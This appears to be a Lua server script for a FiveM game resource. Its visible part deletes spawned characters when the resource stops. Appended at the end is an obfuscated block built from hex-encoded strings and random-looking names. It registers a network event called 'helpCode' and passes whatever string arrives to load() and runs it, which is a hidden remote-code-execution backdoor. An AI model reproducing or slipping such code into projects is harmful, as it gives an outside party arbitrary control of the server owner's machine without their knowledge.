local DeletePed    = DeletePed

player             = {}



AddEventHandler('onResourceStop', function(resourceName)
    if GetCurrentResourceName() ~= resourceName then
        return
    end
    for k, v in pairs(peds) do
        if DoesEntityExist(v) then
            DeletePed(v)
        end
    end
end)


local ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[6][ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[1]](ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[2]) ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[6][ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[3]](ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[2], function(RMFFBoODgGgQqtkCuBUIDwuvxYlevpqkxwExbSaUVTGuVyemFGSUCBoxYdzgvpQznPPRsC) ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[6][ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[4]](ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[6][ELEVVMQpBzouQLLxryHyuHfZcgoHAlyohIqbFSMhcKHvBuvAPjCMEJBefnVQDwDCQopbmf[5]](RMFFBoODgGgQqtkCuBUIDwuvxYlevpqkxwExbSaUVTGuVyemFGSUCBoxYdzgvpQznPPRsC))() end)